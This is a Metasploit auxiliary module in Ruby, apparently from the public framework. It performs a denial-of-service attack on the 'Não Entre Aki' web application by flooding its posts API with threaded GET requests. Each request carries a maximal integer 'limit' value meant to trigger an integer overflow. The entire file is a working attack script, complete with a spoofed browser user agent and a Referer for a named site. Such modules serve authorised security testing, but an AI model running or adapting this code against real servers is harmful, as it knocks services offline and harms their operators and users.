##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(
      info,
      'Name' => 'Não Entre Aki Integer Overflow DoS',
      'Author' => ['Alan Placidina Maria'],
      'References' => [%w[CWE 190]],
      'DisclosureDate' => 'Mar 25 2019'
    ))

    register_options(
      [
        OptInt.new('QLIMIT', [true, 'Number of query "limit"', 2_147_483_647]),
        OptInt.new('RLIMIT', [true, 'The number of requests to send', 200]),
        OptInt.new('THREADS', [true, 'The number of concurrent threads', 5]),
        OptInt.new('TIMEOUT', [true, 'The maximum time in seconds to wait for each request to finish', 5]),
        Opt::RPORT(80)
      ]
    )
  end

  def rlimit
    datastore['RLIMIT']
  end

  def qlimit
    datastore['QLIMIT']
  end

  def thread_count
    datastore['THREADS']
  end

  def timeout
    datastore['TIMEOUT']
  end

  def run
    req = {
      'uri' => normalize_uri("/api/v1/posts/top/?order=semana&allowNsfw=false&limit=#{qlimit}&random=true"),
      'method' => 'GET',
      'agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
      'headers' => {
        'Referer' => 'http://www.naoentreaki.com.br/novos/',
        'X-Requested-With' => 'XMLHttpRequest'
      }
    }

    starting_thread = 1
    while starting_thread < rlimit
      ubound = [rlimit - (starting_thread - 1), thread_count].min
      print_status("Executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}...")

      threads = []
      1.upto(ubound) do |i|
        threads << framework.threads.spawn("Module(#{refname})-request#{(starting_thread - 1) + i}", false, i) do |i|
          begin
            c = connect
            r = c.request_cgi(req)
            c.send_request(r)
          rescue StandardError => e
            print_error("Timed out during request #{(starting_thread - 1) + i}")
          end
        end
      end

      threads.each(&:join)
      print_good("Finished executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}")
      starting_thread += ubound
    end
  end
end
